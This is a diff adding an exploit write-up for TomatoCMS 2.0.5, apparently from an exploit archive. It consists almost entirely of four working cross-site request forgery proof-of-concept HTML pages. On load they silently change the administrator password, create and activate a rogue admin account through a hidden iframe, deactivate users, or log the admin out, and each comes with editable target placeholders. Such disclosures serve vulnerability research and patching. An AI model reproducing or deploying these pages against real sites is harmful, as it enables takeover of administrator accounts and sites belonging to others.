@@ -1,0 +1,82 @@
+<!---
+    Title: TomatoCMS 2.0.5 Multiple CSRF Vulnerabilities
+    Author: 10n1z3d <10n1z3d[at]w[dot]cn>
+    Date: Sun 11 Jul 2010 03:36:08 PM EEST 
+    Vendor: http://www.tomatocms.com/
+    Download: None
+--->
+
+-=[ CSRF PoC 1 - Change Administrator Password ]=-
+
+    <html>
+        <head>
+            <title>TomatoCMS 2.0.5 Multiple CSRF Vulnerabilities - Change Admin Password</title>
+        </head>
+        <body onload="document.csrf.submit();">
+            <form name="csrf" action="http://[domain]/index.php/admin/core/user/changepass" method="post">
+                <!--- Edit these --->
+                <input type="hidden" name="password" value="rootroot" />
+                <input type="hidden" name="passwordConfirm" value="rootroot" />
+            </form>
+        </body>
+    </html>  
+    
+-=[ CSRF PoC 2 - Create Admin User ]=-
+
+    <html>
+        <head>
+            <title>TomatoCMS 2.0.5 Multiple CSRF Vulnerabilities - Create Admin User</title>
+        </head>
+        <!--- Submit the first form and delay the second one to make sure the POST request is completed --->
+        <body onload="document.csrf1.submit();setTimeout('document.csrf2.submit();',5000);">
+            <!--- We need this to submit the forms without redirects --->
+            <div style="visibility:hidden">
+                <iframe name="ipwn" width="20" height="20"></iframe>
+            </div> 
+            
+            <!--- Creates the user --->
+            <form name="csrf1" target="ipwn" action="http://[domain]/index.php/admin/core/user/add" method="post">
+                <!--- Edit these --->
+                <input type="hidden" name="full_name" value="root" />
+                <input type="hidden" name="username" value="root" />
+                <input type="hidden" name="email" value="root@root.com"/>
+                <input type="hidden" name="password" value="rootroot"/>
+                <input type="hidden" name="password2" value="rootroot" />
+                <!--- Do not edit below --->
+                <input type="hidden" name="role" value="1" />
+            </form>
+            
+            <!--- Activates the user --->
+            <form name="csrf2" target="ipwn" action="http://[domain]/index.php/admin/core/user/activate" method="post">
+                <!--- We are not sure about the user id but we can guess :) --->
+                <input type="hidden" name="id" value="2" />
+                <!--- Do not edit below --->
+                <input type="hidden" name="status" value="0" />
+            </form>
+        </body>
+    </html>
+    
+-=[ CSRF PoC 3 - Deactivate User ]=-
+
+    <html>
+        <head>
+            <title>TomatoCMS 2.0.5 Multiple CSRF Vulnerabilities - Deactivate User</title>
+        </head>
+        <body onload="document.csrf.submit();">
+            <form name="csrf" action="http://[domain]/index.php/admin/core/user/activate" method="post">
+                <!--- Edit this --->
+                <input type="hidden" name="id" value="1" />
+                <!--- Do not edit below --->
+                <input type="hidden" name="status" value="1" />
+            </form>
+        </body>
+    </html>
+
+-=[ CSRF PoC 4 - Logout The Administrator ]=-
+    
+    <img src="http://[domain]/index.php/core/auth/logout" alt="Do you see this?" />
+   
+<!---
+    http://www.evilzone.org/
+    irc.evilzone.org  (6697 / 9999)
+--->
